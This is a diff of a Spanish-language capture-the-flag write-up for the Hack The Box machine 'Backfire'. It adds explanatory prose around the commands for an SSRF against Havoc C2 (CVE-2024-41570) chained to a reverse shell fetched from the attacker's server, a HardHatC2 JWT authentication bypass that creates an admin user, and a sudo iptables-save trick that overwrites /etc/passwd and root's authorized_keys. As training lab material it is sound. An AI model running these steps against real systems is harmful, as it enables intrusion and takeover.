@@ -1,6 +1,6 @@
 ---
-hidden: true
 icon: desktop
+hidden: true
 layout:
   title:
     visible: true
@@ -50,9 +50,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.38 seconds
 
 ```
 
-
-
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -65,7 +63,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.38 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato `oN` y `oX` para posteriormente trabajar con ellos. Verificamos que al parecer se trata de una máquina Ubuntu que dispone de dos páginas de `Nginx` (puerto 443 y 8000) y el servicio`SSH`.
 
 ```bash
 ❯ nmap -sCV -p22,443,8000 10.10.11.49 -A -oN targeted -oX targetedXML
@@ -116,7 +114,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 20.45 secondsBAS
 ```
 
-
+Procederemos a transformar el archivo generado `targetedXML` para transformar el `XML` en un archivo `HTML` para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -125,27 +123,21 @@ Nmap done: 1 IP address (1 host up) scanned in 20.45 secondsBAS
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../../../.gitbook/assets/3969_vmware_dFPPcDbcDT.png" alt=""><figcaption></figcaption></figure>
 
-
-
 ## Web Enumeration
 
-
+Revisando la página web de [https://10.10.11.49](https://10.10.11.49), verificamos que nos carga una página con un error de `404 Not Found` de `Nginx`.
 
 <figure><img src="../../../../.gitbook/assets/imagen (203).png" alt=""><figcaption></figcaption></figure>
 
-
+Revisando la página web de [http://10.10.11.49:8000](http://10.10.11.49:8000), nos encontramos con dos archivos, los descargaremos para verificar el contenido de estos.
 
 <figure><img src="../../../../.gitbook/assets/imagen (204).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-
+El archivo `disable_tls.patch` aplica cambios para deshabilitar TLS en las conexiones WebSocket del puerto de gestión 40056. Según los comentarios, el objetivo es probar que "sergej no está trabajando". Aclaran que el puerto solo permite conexiones locales mediante tunelización SSH, por lo que, según ellos, esto no comprometería la seguridad del servidor.
 
 ```bash
 ❯ cat disable_tls.patch
@@ -186,7 +178,11 @@ index 9d1c21f..59d350d 100644
  		}
 ```
 
+El archivo `havoc.yaotl` es una configuración para un equipo que utiliza el framework Havoc. Este archivo contiene información clave sobre la configuración del **teamserver**, las credenciales de los operadores, la configuración de los demonios y los listeners. El TeamServer se encuentra en un puerto interno 40056.
 
+{% hint style="info" %}
+**Havoc C2** es un framework de **Command and Control (C2)** que se utiliza comúnmente en operaciones de **red team** o **penetration testing**. Este tipo de herramientas permiten a los pentesters y actores malintencionados comunicarse con sistemas comprometidos para realizar exfiltración de datos, ejecución remota de comandos, control persistente, entre otras actividades.
+{% endhint %}
 
 ```bash
 ❯ cat havoc.yaotl
@@ -238,27 +234,19 @@ Listeners {
 }
 ```
 
-
-
-
-
 ## Initial Access
 
 ### Exploitation SSRF HavocC2 - (CVE-2024-41570)
 
-
-
-
-
-
+Durante la fase de investigación, identificamos una vulnerabilidad en HavocC2 relacionada con un **SSRF (Server Side Request Forgery)**, documentada en el `CVE-2024-41570`. Para explorarla, utilizamos el siguiente repositorio público que contiene una prueba de concepto (PoC):
 
 {% embed url="https://github.com/chebuya/Havoc-C2-SSRF-poc" %}
 
-
+Según el blog del creador de la PoC, la vulnerabilidad permite explotar una solicitud maliciosa para interactuar con recursos internos del servidor, lo que potencialmente puede revelar información sensible, como direcciones IP internas o servicios en ejecución.
 
 {% embed url="https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/" %}
 
-
+En este caso, nos clonamos el proyecto en nuestro equipo local.
 
 ```bash
 ❯ git clone https://github.com/chebuya/Havoc-C2-SSRF-poc; cd Havoc-C2-SSRF-poc
@@ -271,14 +259,14 @@ Recibiendo objetos: 100% (39/39), 14.83 KiB | 460.00 KiB/s, listo.
 Resolviendo deltas: 100% (10/10), listo.
 ```
 
-
+Levantamos un servidor HTTP local para recibir las solicitudes provenientes de la explotación del SSRF.
 
 ```bash
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Utilizamos el script `exploit.py` de la PoC para interactuar con el equipo objetivo y tratar de descubrir información interna.
 
 ```bash
 ❯ python3 exploit.py -t https://10.10.11.49 -i 10.10.16.5 -p 80
@@ -312,7 +300,7 @@ Content-Length: 335
 </html>
 ```
 
-
+Aunque el exploit se ejecutó correctamente, la solicitud realizada al servidor no reveló información adicional relevante. En lugar de una dirección IP interna, recibimos la respuesta HTTP estándar `404 File not found`.
 
 ```bash
 ❯ python3 -m http.server 80
@@ -321,13 +309,21 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.49 - - [21/Jan/2025 09:43:01] "GET /vulnerable HTTP/1.1" 404 -
 ```
 
-
-
-
-
 ### Creating a Python Script to exploit SSRF-RCE on the machine
 
+Con la ayuda de ChatGPT, creamos el siguiente script en Python que aprovecha una vulnerabilidad de **SSRF** para lograr un **RCE**, adaptándose a las configuraciones observadas en el sistema objetivo. A continuación, se detalla su funcionamiento:
 
+**Registro del Agente**
+
+La función `register_agent` envía una solicitud cifrada con información del host comprometido, incluyendo nombre del usuario, IP interna y detalles del proceso. Esto registra al agente malicioso en el sistema.
+
+**Comunicación mediante WebSocket**
+
+Se establece un WebSocket autenticado utilizando las credenciales `ilya:CobaltStr1keSuckz!`. Posteriormente, se configura un listener para recibir conexiones del sistema objetivo.
+
+**Construcción del Payload SSRF-RCE**
+
+El payload malicioso utiliza la siguiente cadena para ejecutar comandos arbitrarios en el servidor
 
 {% code title="SSRF-RCE.py" %}
 ```python
@@ -604,7 +600,7 @@ write_socket(socket_id, frame,message)
 ```
 {% endcode %}
 
-
+Crearemos nuestro archivo `payload.sh` el cual ejecuta una Reverse Shell hacía nuestro equipo. Lo compartiremos a través de un servidor web por el puerto especificado en el exploit.
 
 ```bash
 ❯ cat payload.sh
@@ -616,14 +612,14 @@ write_socket(socket_id, frame,message)
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 ```
 
-
+Por otro lado, nos pondremos en escucha por el puerto indicado en la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 444
 listening on [any] 444 ...
 ```
 
-
+Al ejecutar el `exploit.py` modificado, le indicaremos el `target` el cual será el objetivo https://10.10.11.49 y la dirección y puertos internos del WebSocket que encontramos en la configuración de `HavocC2`.
 
 ```bash
 ❯ python3 SSRF.py --target https://10.10.11.49 -i 127.0.0.1 -p 40056
@@ -641,7 +637,7 @@ listening on [any] 444 ...
 [***] Success!
 ```
 
-
+Verificamos que hemos logrado explotar la vulnerabilidad de SSRF combinaco con el rce para obtener acceso al equipo. Logramos verificar la flag de **user.txt**.
 
 ```bash
 ❯ nc -nlvp 444
@@ -655,9 +651,13 @@ ilya@backfire:~/Havoc/payloads/Demon$ cat /home/ilya/user.txt
 f5448999f2**********************
 ```
 
-
-
 ### Uploading our public SSH key to the machine to connect with SSH
+
+La Shell que hemos recibido, por un motivo u otro era bastante inestable y se cerraba al poco tiempo.&#x20;
+
+Por lo tanto, lo que decidimos es subir nuestra clave pública SSH al equipo para conectarnos mediante SSH sin proporcionar credenciales.
+
+En nuestro equipo atacante, generaremos unas nuevas claves SSH.
 
 ```bash
 ❯ ssh-keygen
@@ -683,16 +683,14 @@ The key's randomart image is:
 +----[SHA256]-----+
 ```
 
-
+Revisaremos el contenido de nuestra clave SSH pública.
 
 ```bash
-❯ cp /home/kali/.ssh/id_ed25519.pub .
-
 ❯ cat id_ed25519.pub
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINchj1ycZWUZctrUZl/nhPPxygCF1kT7UbFMFfVqiyz0 kali@kali
 ```
 
-
+Estando conectados en el equipo víctima, navegaremos al directorio `/home/ilya/.ssh` para añadir nuestra clave pública en el archivo `authorized_keys`.
 
 ```bash
 ilya@backfire:~/Havoc/payloads/Demon$ cd /home/ilya/.ssh/
@@ -709,7 +707,7 @@ cat authorized_keys
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINchj1ycZWUZctrUZl/nhPPxygCF1kT7UbFMFfVqiyz0 kali@kali
 ```
 
-
+Desde nuestro equipo atacante, nos conectaremos mediante SSH al equipo víctima con el usuario `ilya` y verificaremos que no nos requiere de credenciales de acceso.
 
 ```bash
 ❯ ssh ilya@10.10.11.49
@@ -722,15 +720,11 @@ Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-0
 ilya@backfire:~$
 ```
 
-
-
 ## Lateral Movement
-
-
 
 ### Reviewing services on the machine and detecting running HardHat 2 services
 
-
+Revisando el directorio de `ilya`, nos encontramos con el siguiente archivo `hardhat.txt` el cual informa que el usuario `sergej` dice haber instalado `HardHatC2` para realizar pruebas y que no realizó ningún cambio a las configuraciones por defecto. También indica que espera que haya escogido el C2 de `Havoc` en vez del mencionado.
 
 ```bash
 ilya@backfire:~$ ls -l
@@ -744,11 +738,15 @@ Sergej said he installed HardHatC2 for testing and  not made any changes to the 
 I hope he prefers Havoc bcoz I don't wanna learn another C2 framework, also Go > C# 
 ```
 
+Buscamos información sobre `HardHat C2`, nos encontramos con el repositorio del framework en el cual nos informan de las características, configuraciones y demás. Entre la información obtenida del repositorio del framework, nos informa que normalmente utiliza los puertos `5000` y `7096`.
 
+{% hint style="info" %}
+**HerdHat C2** es un framework o plataforma utilizada en el ámbito de **penetration testing** o **red teaming** para la **gestión y ejecución de ataques** mediante **Command and Control (C2)**. Se basa en permitir el **comando y control remoto** sobre sistemas comprometidos, proporcionando capacidades avanzadas para persistencia, exfiltración de datos, ejecución remota de comandos, y otros tipos de interacciones maliciosas.
+{% endhint %}
 
 {% embed url="https://github.com/DragoQCC/HardHatC2" %}
 
-
+Al verificar los puertos internos que se encuentran en ejecución en el equipo víctima, verificamos que estos puertos están abiertos de manera interna. Lo cual nos hace pensar que el framework de `HardHat C2` se encuentra activo.
 
 ```bash
 ilya@backfire:~$ netstat -ano | grep "LISTEN"
@@ -762,7 +760,7 @@ tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
 tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
 ```
 
-
+Revisando los procesos activos, verificamos que el usuario `sergej` es el que está levantando este framework.
 
 ```bash
 ilya@backfire:~$ ps aux
@@ -774,7 +772,7 @@ sergej      3755  1.4  3.1 274204428 123208 ?    Sl   23:10   0:04 /home/sergej/
 sergej      3777  1.0  3.1 274194936 125060 ?    Sl   23:10   0:02 /home/sergej/HardHatC2/HardHatC2Client/bin/Release/net7.0/HardHatC2Client
 ```
 
-
+Por otro lado, verificamos a través de los siguientes comandos que efectivamente el servicio se encuentre en ejecución.
 
 ```bash
 ilya@backfire:/etc/systemd/system$ systemctl status hardhat_server
@@ -806,7 +804,7 @@ ilya@backfire:/etc/systemd/system$ systemctl status hardhat_client
 Warning: some journal files were not opened due to insufficient permissions.
 ```
 
-
+Revisando el directorio `/etc/systemd/system`, nos encontramos con los archivos relacionados a `HardHat C2`.
 
 ```bash
 ilya@backfire:/etc/systemd/system$ ls -l
@@ -828,7 +826,7 @@ lrwxrwxrwx 1 root root   41 Sep 27 16:43 vmtoolsd.service -> /lib/systemd/system
 -rw-r--r-- 1 root root  170 Sep 28 20:31 webserver.service
 ```
 
-
+Investigamos sobre el contenido de estos archivos, por si tuvieran alguna configuración que nos pudiese aportar información. En este caso, nos indican la misma información obtenida anteriormente.
 
 ```bash
 ilya@backfire:/etc/systemd/system$ cat hardhat_client.service
@@ -869,11 +867,9 @@ Restart=always
 WantedBy=multi-user.target
 ```
 
-
-
 ### SSH Port Forwarding to Share Internal Ports
 
-
+Decidimos realizar **SSH Port Forwarding** para disponer de estos puertos en nuestro equipo local por los mismos puertos mencionados.
 
 ```bash
 ❯ ssh -L 127.0.0.1:5000:127.0.0.1:5000 -L 127.0.0.1:7096:127.0.0.1:7096 ilya@10.10.11.49
@@ -889,7 +885,7 @@ Last login: Tue Dec 17 11:30:51 2024 from 10.10.16.5
 ilya@backfire:~$
 ```
 
-
+Verificaremos que los puertos se encuentren abiertos en nuestro equipo local, es decir, que se haya realizado el **SSH Port Forwarding** correctamente.
 
 ```bash
 ❯ nmap -p- --open localhost
@@ -905,31 +901,25 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 14.05 seconds
 ```
 
+Desde nuestro navegador, probaremos de acceder a https://127.0.0.1:7096 y nos encontramos con el panel de inicio de sesión de `HardHat C2`.
 
+<figure><img src="../../../../.gitbook/assets/imagen (205).png" alt="" width="563"><figcaption></figcaption></figure>
 
-acceso a hardhatc2 [https://127.0.0.1:7096/](https://127.0.0.1:7096/)
-
-
-
-<figure><img src="../../../../.gitbook/assets/imagen (205).png" alt=""><figcaption></figcaption></figure>
-
-
+Si investigamos sobre la página [https://127.0.0.1:5000](https://127.0.0.1:5000), no encontramos ningún tipo de información.
 
 <figure><img src="../../../../.gitbook/assets/imagen (206).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
 ### HardHatC2 AuthN Bypass
 
-
+Al investigar vulnerabilidades en HardHatC2, encontramos información sobre varias fallas en este framework.
 
 {% embed url="https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7" %}
 
+Por defecto, HardHatC2 genera automáticamente una contraseña para la cuenta **HardHat\_Admin**, la cual se muestra solo una vez al inicio. Sin embargo, el sistema utiliza una **clave estática de firma JWT** almacenada en `appsettings.json`, que permite a los atacantes generar tokens JWT válidos sin necesidad de autenticación.
 
+Con esta vulnerabilidad, se puede usar el JWT para forjar un token y crear usuarios administradores sin necesidad de autenticarse.
 
-
+Basándonos en el acceso a los puertos y en el archivo `.txt` inicial, donde se mencionaba que el framework había sido instalado con configuración por defecto, decidimos probar esta vulnerabilidad
 
 {% code title="Bypass.py" %}
 ```python
@@ -978,9 +968,7 @@ print(r.text)
 ```
 {% endcode %}
 
-
-
-
+Al ejecutar el `Bypass.py`, verificamos que en un principio hemos logrado crear un usuario llamado `gzzcoo`.
 
 ```bash
 ❯ python Bypass.py
@@ -993,37 +981,27 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJIYXJkSGF0X0FkbWluIiwianRpIjoiM2R
 User gzzcoo created
 ```
 
-
-
-
+Probaremos de autenticarnos en el panel de `HardHat C2` y comprobamos que hemos logrado obtener el acceso correspondiente.
 
 <figure><img src="../../../../.gitbook/assets/imagen (207).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ### HardHatC2 Remote Code Execution (RCE)
 
+En el mismo blog en el cual nos mencionaban diferentes vulnerabilidades, se nos informaba que una vez obtenido un usuario nuevo creado con permisos de Admin, podríamos llegar a explotar un Remote Code Execution (RCE).
 
+Para ello, debeemos acceder a[https://127.0.0.1:7096/ImplantInteract](https://127.0.0.1:7096/ImplantInteract) y dispondremos de una opción llamada "Terminal·" en la cual podemos ejecutar comandos arbitrarios.
 
-[https://127.0.0.1:7096/ImplantInteract](https://127.0.0.1:7096/ImplantInteract) a
-
-
-
-
+Al probar dicha funcionalidad, comprobamos que el usuario que ejecuta el comando se trata de `sergej`.
 
 <figure><img src="../../../../.gitbook/assets/imagen (208).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ## Privilege Escalation
-
-
-
-
 
 ### Abusing sudoers privileges (iptables && iptables-save)
 
+Revisando maneras de escalar nuestros privilegios para convertirnos en usuario`root`, nos encontramos que el usuario `sergej` dispone de permisos `sudoers` sobre `iptables && iptables-save`.
 
+Realizando una bíusqueda en internet, nos encontramos con el siguiente blog que nos muestran un PoC de cómo elevar nuestros privilegios disponiendo de ambos permisos `sudoers` que dispone el usuario actual.
 
 {% embed url="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/" %}
 
@@ -1031,7 +1009,11 @@ User gzzcoo created
 
 ### Overwriting /etc/passwd to Add New Root User via sudoers (iptables & iptables-save)
 
+En el PoC del blog mencionado, se nos informa que disponiendo de ambos permisos de `sudoers`, podemos intentar sobreescribir el archivo `/etc/passwd` para añadir una nueva entrada de un nuevo usuario `root` con una contraseña asignada por nosotros mismos.
 
+En este caso, lo que realizaremos es copiar la entrada de nuestro `/etc/passwd` para tener la estructura de lo que deberemos añadir en el archivo de la máquina víctima.
+
+Una vez tengamos la entrada de plantilla, lo que deberemos realizar es crear una contraseña en el formato de `OpenSSL`. Deberemos de reemplazar el valor `x` por el de la contreaseña generada, para lograr obtener el siguiente resultado --> _root:$1$Gow86CXS$sHAPSqpiT4xePLCPO147m1:0:0:root:/root:/bin/bash_
 
 ```bash
 ❯ catnp /etc/passwd | head -n 1
@@ -1041,7 +1023,9 @@ root:x:0:0:root:/root:/usr/bin/zsh
 $1$Gow86CXS$sHAPSqpiT4xePLCPO147m1
 ```
 
+Inyectaremos la entrada `root`falsificada en un nuevo comentario de regla de iptables, verificaremos que se encuentra añadida esta línea en las reglas de iptables y procederemos a sobreescribir el archivo `/etc/passwd` para añadir esta nueva entrada del usuario `root`.
 
+En este caso, por x motivos no logramos sobreescribir el archivo mencionado, nos indica que la operación no está permitida.
 
 ```bash
 sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nroot:$1$Gow86CXS$sHAPSqpiT4xePLCPO147m1:0:0:root:/root:/bin/bash\n'
@@ -1051,22 +1035,20 @@ sudo /usr/sbin/iptables -S
 sudo /usr/sbin/iptables-save -f /etc/passwd
 ```
 
-
-
 <figure><img src="../../../../.gitbook/assets/imagen (210).png" alt=""><figcaption></figcaption></figure>
-
-
 
 ### **Overwriting /root/.ssh/authorized\_keys to Upload Our Public SSH Key via sudoers (iptables & iptables-save)**
 
+Buscando otras maneras de aprovecharnos de estos privilegios de `sudoers`, pensamos en subir nuestra clave pública SSH al archivo `authorized_keys` del usuario `root.` En un principio no deberíamos tener problemas al ejecutar el `iptables && iptables-save` con permisos de `sudo`.
 
+Copiaremos nuestra clave SSH pública que obtuvimos en los pasos anteriores.
 
 ```bash
 ❯ cat id_ed25519.pub
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINchj1ycZWUZctrUZl/nhPPxygCF1kT7UbFMFfVqiyz0 kali@kali
 ```
 
-
+Volveremos a realizar el PrivEsc aprovechándonos de estos permisos de `sudoers`. En este caso, crearemos un nuevo comentario que contenga nuestra clave SSH pública. Revisaremos que nos aparece el comentario en las reglas de `iptables`, y procederemos a sobreescribir el archivo mencionado.
 
 ```bash
 sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINchj1ycZWUZctrUZl/nhPPxygCF1kT7UbFMFfVqiyz0 kali@kali\n'
@@ -1078,7 +1060,9 @@ sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
 
 <figure><img src="../../../../.gitbook/assets/imagen (211).png" alt=""><figcaption></figcaption></figure>
 
+Al intentar acceder mediante SSH con el usuario `root`, comprobamos que no se solicita credenciales. Al subir nuestra clave pública SSH al archivo `/root/.ssh/authorized_keys`, logramos conectarnos sin necesidad de proporcionar una contraseña, ya que la clave pública almacenada en ese archivo se comunica directamente con nuestra clave privada.
 
+Logramos acceso a la máquina como usuario `root` y verificamos la flag de **root.txt**.
 
 ```bash
 ❯ ssh root@10.10.11.49
